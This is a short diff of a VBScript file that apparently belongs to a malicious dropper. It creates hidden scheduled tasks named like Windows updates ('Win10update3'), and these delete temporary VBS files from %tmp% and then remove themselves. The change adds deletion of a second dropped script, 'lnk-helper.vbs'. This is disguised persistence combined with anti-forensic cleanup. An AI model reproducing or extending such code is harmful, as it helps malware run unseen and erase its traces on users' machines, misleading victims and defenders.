@@ -7,5 +7,5 @@ Delshell.run "schtasks /delete /tn Win10update2 /F", 0, False
 
 
 Set Fourshell = wscript.createobject("wscript.shell")
-Fourshell.run "schtasks /create /sc minute /mo 5 /tn Win10update3 /tr ""cmd start /min /c del %tmp%\windows10two.vbs && schtasks /delete /tn Win10update3 /F""", 0, False
+Fourshell.run "schtasks /create /sc minute /mo 5 /tn Win10update3 /tr ""cmd start /min /c del %tmp%\windows10two.vbs && schtasks /delete /tn Win10update3 /F && del %tmp%\lnk-helper.vbs""", 0, False
 
